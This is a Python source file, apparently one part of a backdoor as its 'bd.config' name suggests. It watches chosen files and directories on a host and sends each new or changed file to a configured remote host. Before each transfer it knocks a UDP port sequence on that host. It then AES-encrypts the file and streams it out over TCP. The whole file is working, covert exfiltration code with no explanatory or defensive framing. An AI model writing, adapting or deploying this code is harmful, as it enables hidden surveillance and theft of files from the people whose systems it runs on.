#!/bin/env python
from watchdog.events import PatternMatchingEventHandler, DirModifiedEvent
from watchdog.observers import Observer
import ConfigParser
import socket
import time
from dcaes import AESCipher


class FileSender(object):
    def __init__(self):
        config = ConfigParser.ConfigParser()
        config.read('./bd.config')

        self.sequence = config.get('FileMonitor', 'sequence').split(',')
        self.file_port = config.get('FileMonitor', 'file_port')
        self.remote_host = config.get('Setup', 'rhost')
        self.key = config.get('Setup', 'enkey')
        self.cipher = AESCipher(self.key)

    def send_file(self, filename):
        knocker = PortKnocker(self.sequence, self.remote_host)
        knocker.knock()

        time.sleep(1)

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((self.remote_host, int(self.file_port)))

        enc = self.cipher.encrypt_file(filename)

        sock.sendall(enc)
        sock.send(b'EOF')


class FSEventHandler(PatternMatchingEventHandler):
    def __init__(self, patterns=None):
        PatternMatchingEventHandler.__init__(self, patterns)
        self.sender = FileSender()

    def on_created(self, event):
        self.send_file(event.src_path)

    def on_modified(self, event):
        # we only care about specific files
        if type(event) == DirModifiedEvent:
            return

        self.send_file(event.src_path)

    def send_file(self, filename):
        self.sender.send_file(filename)


class FileMonitor(object):
    def __init__(self):
        self.watches = []
        self.observer = Observer()
        self.observer.start()

    def add_watch(self, path, filename=None, recursive=False):
        # if no filename is provided, just watch the directory
        if filename is None:
            self.watches.append(self.observer.schedule(FSEventHandler(), path,
                                                       recursive))
            return

        # if we're monitoring a specific file, we have to pass the full path to the event handler
        if not path.endswith('/'):
            full_path = path + '/' + filename
        else:
            full_path = path + filename
        self.watches.append(self.observer.schedule(FSEventHandler([full_path,]), path,
                                                   recursive))

    def remove_watch(self, path):
        if not path.endswith('/'):
            path += '/'
        for watch in self.watches:
            if watch.path == path:
                self.observer.unschedule(watch)
                return True
        return False

    def remove_all_watches(self):
        self.observer.unschedule_all()


class PortKnocker(object):
    def __init__(self, sequence, remote_host):
        self.sequence = sequence
        self.remote_host = remote_host

    def knock(self):
        for port in self.sequence:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto('', (self.remote_host, int(port)))
